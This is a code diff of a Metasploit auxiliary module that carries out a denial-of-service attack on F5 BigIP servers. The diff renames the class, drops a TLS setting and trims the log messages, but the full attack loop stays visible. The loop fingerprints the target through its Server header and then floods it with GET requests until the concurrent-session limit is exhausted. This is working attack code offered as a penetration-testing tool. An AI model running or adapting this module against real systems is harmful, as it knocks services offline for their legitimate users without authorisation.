@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Dos
 
@@ -37,7 +37,6 @@ class Metasploit3 < Msf::Auxiliary
       'DefaultOptions' =>
         {
           'SSL' => true,
-          'SSLVersion' => 'TLS1',
           'RPORT' => 443
         }
     ))
@@ -56,27 +55,27 @@ class Metasploit3 < Msf::Auxiliary
     res = send_request_cgi('method' => 'GET', 'uri' => '/')
 
     unless res
-      print_error("#{peer} - No answer from the BigIP server")
+      print_error("No answer from the BigIP server")
       return
     end
 
     # Simple test based on HTTP Server header to detect BigIP virtual server
     server = res.headers['Server']
     unless server =~ /BIG\-IP/ || server =~ /BigIP/ || force_attack
-      print_error("#{peer} - BigIP virtual server was not detected. Please check options")
+      print_error("BigIP virtual server was not detected. Please check options")
       return
     end
 
-    print_status("#{peer} - Starting DoS attack")
+    print_status("Starting DoS attack")
 
     # Start attack
     limit.times do |step|
       if step % 100 == 0
-        print_status("#{peer} - #{step * 100 / limit}% accomplished...")
+        print_status("#{step * 100 / limit}% accomplished...")
       end
       res = send_request_cgi('method' => 'GET', 'uri' => '/')
       if res && res.headers['Location'] =~ /\/my\.logout\.php3\?errorcode=14/
-        print_good("#{peer} - DoS accomplished: The maximum number of concurrent user sessions has been reached.")
+        print_good("DoS accomplished: The maximum number of concurrent user sessions has been reached.")
         return
       end
     end
@@ -84,18 +83,18 @@ class Metasploit3 < Msf::Auxiliary
     # Check if attack has failed
     res = send_request_cgi('method' => 'GET', 'uri' => uri)
     if res.headers['Location'] =~ /\/my.policy/
-      print_error("#{peer} - DoS attack failed. Try to increase the RLIMIT")
+      print_error("DoS attack failed. Try to increase the RLIMIT")
     else
-      print_status("#{peer} - Result is undefined. Try to manually determine DoS attack result")
+      print_status("Result is undefined. Try to manually determine DoS attack result")
     end
 
     rescue ::Errno::ECONNRESET
-      print_error("#{peer} - The connection was reset. Maybe BigIP 'Max In Progress Sessions Per Client IP' counter was reached")
+      print_error("The connection was reset. Maybe BigIP 'Max In Progress Sessions Per Client IP' counter was reached")
     rescue ::Rex::ConnectionRefused
-      print_error("#{peer} - Unable to connect to BigIP")
+      print_error("Unable to connect to BigIP")
     rescue ::Rex::ConnectionTimeout
-      print_error("#{peer} - Unable to connect to BigIP. Please check options")
+      print_error("Unable to connect to BigIP. Please check options")
     rescue ::OpenSSL::SSL::SSLError
-      print_error("#{peer} - SSL/TLS connection error")
+      print_error("SSL/TLS connection error")
   end
 end
